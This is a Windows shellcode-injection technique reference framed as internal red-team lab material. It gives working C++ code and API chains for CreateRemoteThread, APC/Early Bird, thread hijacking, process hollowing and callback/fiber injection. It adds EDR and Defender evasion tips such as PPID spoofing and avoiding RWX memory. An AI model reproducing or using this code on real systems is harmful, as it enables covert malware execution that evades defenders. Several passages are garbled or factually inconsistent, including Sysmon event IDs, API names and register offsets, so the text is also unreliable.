# Technique Reference: Shellcode Injection on Windows

Applies to: Windows 10 22H2, Windows 11 23H2/24H2. API: ring 3 (usermode). Target: internal red team testing against an approved lab.

---

## 1. CreateRemoteThread (klasik)

**What is sent:** raw shellcode (usually a loader stager → run the original payload in memory) to the target process.

**Rantai API:**

```
OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_CREATE_THREAD, ...)
│
├─ VirtualAllocEx(hProc, NULL, size, MEM_RESERVE|MEM_COMMIT, PAGE_RWX)
├─ WriteProcessMemory(hProc, baseAddr, shellcode, size, ...)
└─ CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddr, param, 0, &tid)
```

**Core code:**

```cpp
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(sc),
           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, mem, sc, sizeof(sc), NULL);
HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                  (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
```

**Artifacts in memory scanner:**

| Artefak | Keterangan |
|---|---|
| RWX region in target process | Common detection: *unbacked executable memory* — region without image file mapping |
| Thread start address in heap/private memory | Moneta: warning "Thread Start Address in Unbacked Memory" |
| PROCESS_VM_WRITE access flow | Sysmon EID 10 (`CreateRemoteThread` in EventID 8) target memory |
| Unknown PE if stager decrypts | YARA hit on stager string (e.g. msf `windows/x64/meterpreter_reverse_tcp`) |

**Why it works:** simplest, works on Windows without EDR.
**Why it fails:** on Windows 11 24H2 + Defender (sense of) up to KB — `PAGE_RWX` immediately notifies memory scan; kernel callback `ObRegisterCallbacks` in EDR blocks *hProc* handle from the linting process.

## 2. APC Queue Injection

**What is sent:** shellcode to target memory + execution via *Asynchronous Procedure Call* run when target is in *alertable state* (`SleepEx`, `WaitForSingleObjectEx`).

**Rantai API:**

```
OpenProcess → VirtualAllocEx → WriteProcessMemory
Thread32Snapshot → Thread32First/Next (kumpulkan TID, pid sama)
QueueUserAPC((PAPCFUNC)baseAddr, hThread, 0)  // semua thread target
```

**Core code:**

```cpp
// enumerasi thread di proses target
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te = { sizeof(te) };
Thread32First(snap, &te);
do {
    if (te.th32OwnerProcessID == pid) {
        HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
        QueueUserAPC((PAPCFUNC)mem, hT, 0);
        CloseHandle(hT);
    }
} while (Thread32Next(snap, &te));
```

**Artefak:**

| Artefak | Keterangan |
|---|---|
| Many `QueueUserAPC` to same PID (within short time) | Sysmon EID 25 ProcessAccess `QueueUserAPC` |
| Thread start in abnormal APC context | EDR (e.g. Crowdstrike) flag "APC injection to alertable process" |
| RWX region (also alive from that VirtualAllocEx) | Same as #1 |

**Why it works:** no `CreateRemoteThread` — calls thread creation API, thus bypasses detection *specific* to CreateRemoteThread.
**Why it fails:** target must enter *alertable state*. Processes like `explorer.exe` or `svchost.exe` do not always enter SleepEx immediately; too many threads trigger flags (anomalous threshold >5 threads is a bright flag in some EDRs).

**Tips:** combine with **Early Bird**: `CreateProcess` with `CreateSuspended` flag → `QueueUserAPC` before ResumeThread — shellcode runs before main binary finishes loading, but Sysmon EID 1 has already logged the new process, the typical pattern ("empty stub + APC") is quickly closed.

## 3. Thread Hijacking

**What is sent:** no new thread. Suspend existing thread → get context → change RIP to shellcode → resume.

**Rantai API:**

```
OpenProcess → OpenThread(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT)
SuspendThread(hThread)
GetThreadContext(hThread, &ctx)   // ctx.ContextFlags = CONTEXT_FULL
ctx.Rip = (DWORD64)baseAddr
SetThreadContext(hThread, &ctx)
ResumeThread(hThread)
```

**Core code:**

```cpp
CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
SuspendThread(hThread);
GetThreadContext(hThread, &ctx);
// shellcode harus momong register & kembalikan RIP asli, atau task ditempleh ke:
ctx.Rip = (DWORD64)shellcodeAddr;
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
```

**Artefak:**

| Artefak | Keterangan |
|---|---|
| Suspend+SetContext+Resume on a thread not owned | Sysmon EID 10 `SetThreadContext` |
| Stack trace "jumps" — RIP points to private memory | Dump analysis: callstack from shellcode does not match existing modules |
| Crucial: shellcode must restore ctx before thread crash | Lazy shellcode (`msf` default) that directly calls `ExitProcess` corrupts the target |

**Why it works:** does not trigger `CreateRemoteThread`/APC signature. Can go directly to a target with a busy main thread (Chrome 131, `chrome.exe` renderer process)
**Why it fails:** causes process crash if shellcode clobbers registers. `SetThreadContext` to a thread owned by a *protected* process (PPL, e.g. `MsMpEng.exe`) is rejected with `Access Denied`.

## 4. Process Hollowing

**What is sent:** legitimate binary (e.g. `notepad.exe`, `svchost.exe` from System32) starts suspended → image is unmapped → malicious image written at base location → resume → malicious PE runs *under the name of a legitimate process*.

**Rantai API:**

```
CreateProcessA("notepad.exe", ..., CREATE_SUSPENDED, ...)
  → GetThreadContext (ambil PEB address via RCX/rbx)
  → NtUnmapViewOfSection(hProc, imageBase)      // ntdll, indirect syscall preferred
  → VirtualAllocEx(base, size, RWX)              // di lokasi base image lama
  → WriteProcessMemory(all sections, rebase delta, fix IAT)
  → WriteProcessMemory(ctx.Rcx, base image + 8)  // set PEB->ImageBaseAddress
  → SetThreadContext → ResumeThread
```

**Core code:**

```cpp
STARTUPINFOEXA siProc = { 0 };
siProc.StartupInfo.cb = sizeof(siProc);
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL,
               (STARTUPINFOA*)&siProc, &pi);

CONTEXT ctx; ctx.ContextFlags = CONTEXT_INTEGER;
GetThreadContext(pi.hThread, &ctx);

// baca PEB->ImageBaseAddress
PVOID remoteBase;
ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, 8, NULL);

NtUnmapViewOfSection(pi.hProcess, remoteBase);
VirtualAllocEx(pi.hProcess, remoteBase, payloadSize,
               MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBase, payload, payloadSize, NULL);
WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, 8, NULL);
ResumeThread(pi.hThread);
```

**Artefak:**

| Artefak | Keterangan |
|---|---|
| Image *hollowed* — file mapping modul mismatch disk | Moneta: flag "Hollowed Module" — image size/nama identik tapi section content berubah |
| `NtUnmapViewOfSection` on image file | Suspicious if hooked and observed (Sysmon non-event—must be via ETW/EtwTi) |
| RWX region *at* image base (unusual) | Image is usually RX + section-level |
| Tandanya proses masuk identitas "anak normal" tapi parent mismatch/lintasan |

**Why it works:** module image has already been unmapped, *image-based* scanning results fail—module is still listed.
**Why it fails:** used for PPL processes (Lsa process) → CreateProcess on protected PID is denied. `dwCreationFlags CREATE_SUSPENDED` on notepad when attached by Claude EDR that follows parent-child tag.

## 5. Callback-based (`EnumWindows`, Fiber, dll.)

**What is sent:** Exploit *callback function* sent *to API* — run *callback* *from* input code. Code execution runs in **own process** (self-injection) — *doesn't* trigger *cross-process artifact*.

**Mechanism:** allocate RWX buffer via `VirtualAlloc` (self), paste shellcode, then transfer to API that accepts function pointer.

**API chain (EnumWindows example):**

```
VirtualAlloc(PAGE_RWX) → memcpy shellcode
EnumWindows((WNDENUMPROC)shellcodeAddr, 0);
```

**Core code:**

```cpp
void* mem = VirtualAlloc(NULL, scSize, MEM_COMMIT|MEM_RESERVE,
                         PAGE_EXECUTE_READWRITE);
memcpy(mem, sc, scSize);
EnumWindows((WNDENUMPROC)mem, (LPARAM)0);
```

**Other callback APIs used by the community:**

```cpp
CertEnumSystemStore((void*)mem);        // crypt32.dll
EnumFonts(GetDC(NULL), 0, (FONTENUMPROC)mem, 0);  // gdi32
CertEnumSystemStoreLocation((void*)mem);
EnumChildWindows(NULL, (WNDENUMPROC)mem, 0);
```

**Fiber:**

```cpp
void* fmem = VirtualAlloc(..., PAGE_EXECUTE_READWRITE);
memcpy(fmem, sc, scSize);
LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)fmem, NULL);
ConvertThreadToFiber(NULL);
SwitchToFiber(fiber);
```

**Artefak:**

| Artefak | Keterangan |
|---|---|
| RWX region self, unbacked | Still detected by *memory scan* if scanner flags PAGE_RWX |
| Start address standard API → log | Call stack: shellcode start follows `user32!EnumWindows` — typical sign in thread callstack |
| Fiber mode: `SwitchToFiber` at runtime | Triggers ETW `ContextSwitch` to fiber callback |
| No Sysmon cross-process event | EventID 8/10, 25 will *never* appear for this technique |

**Why it works:** does not hit *usual* injection class entry points (`CreateRemoteThread` etc.). Self-injection without OpenProcess → Sysmon ProcessAccess-based detection is *completely blind*.
**Why it fails:** shellcode must call clean `ExitThread`, not `ExitProcess`, because callback returning to caller causes crash. `EnumWindows` loops — if callback returns `TRUE` (1) API calls again; trick: else call terminates. If callback returns, EnumWindows itself does not like shellcode “finished” — callstack structure returning to inconsistent usermode triggers (callstack mismatch).

**Field use case:** used for AV bypass on Windows 11 24H2 + Defender (sense) quite well, still fails in EDR ETW-ti (`Microsoft-Windows-Threat-Intelligence` provider) for callback to RWX.

## Operational Pitfalls (why this technique fails in the field)

1. **RWX step bug** `VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)` in most cases likely triggers *dynamic* code guard scan. Lab fix: dual-VAP `PAGE_READWRITE` → `VirtualProtectEx` to `RX` after write. RWX region = red flag Moneta/Defender.
2. **Hypothesis ".NET/asynchronous": APC in non-alertable process.** `chrome.exe` renderer, many worker threads will not call `SleepEx` exactly when scheduled. Consistency: test by changing target to `explorer.exe`, `svchost.exe` (usually alertable), or use Early Bird.
3. **Parent-child tagging (Sysmon).** `CreateProcess` with `CREATE_SUSPENDED` + parent "cmd.exe that says don't" from red team box = EDR ML signature. Fix: **PPID spoofing** (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`) — but *itself* becomes Sysmon EID 1 with `ParentProcessGuid` mismatch that can trigger an *alert*.
4. **PPL/Psi process patch guard.** `OpenProcess(PROCESS_ALL_ACCESS)` to `svchost.exe -k netsvcs` or `lsass.exe` on Windows 11 24H2: handle is returned but stripped. `WriteProcessMemory` fails, `GetLastError() == 0x12B` code `ERROR_PARTIAL_COPY`. *Check `NtQueryInformationProcess` `ProcessProtectionInformation` before injecting.*
5. **Lazy shellcode corrupts the process.** `msfvenom` default stager is `__chkstk` and void-changes `rbx`, `rsi`. In thread hijack, it either works or crashes the process — *data* runs fine before crash at *stack unwind*. Fix: *position-independent* shellcode with prolog push all non-volatile registers + epilog restore if you want the thread to succeed.
6. **BOF / cobalt strike stubborn ArtifactDefault RWX** → if post-exploit (BOF) does not use `mprotect` correctly, SC deceives; runs but flagged.
7. **ETW Threat-Intelligence (Windows 11+ only)** — there is no `Sysmon` from it, but `EtwTi` provider flags `NtMapViewOfSection`, `NtUnmapViewOfSection`, and `VirtualAlloc` RWX directly in kernel → sent to EDR endpoint. Sysmon *does not* see this but Defender for Endpoint edr-sense and other mid-tier EDRs see it. *The assumption that this technique is silent because "Sysmon does not log" is a wrong assumption for Windows 11.*
8. **Callback technique: crash because EnumWindows callback does not return FALSE.** Field test: EnumWindows callback returns non-zero → EnumWindowsList again → causes loop or crash. The common "lightbox" detection is the `EnumWindows + VirtualAlloc` sequence in ETW even in Defender free—do not use on production Windows 11 machines.
9. **EDR blocking the handle itself.** Some modern EDRs (Crowdstrike, "Process Suspension" 6.x, SentinelOne 23.x, ESET v17) *"kernel"* callback `ObRegisterCallbacks` can strip `PROCESS_VM_OPERATION` flag and prevent `OpenProcess` from *unsigned* processes — handle is successfully obtained but `VirtualAllocEx` fails with code `ERROR_INVALID_ACCESS`. Do not expect a handle; testing via `NtQueryInformationProcess` alone is enough to know whether it is still healthy or not.
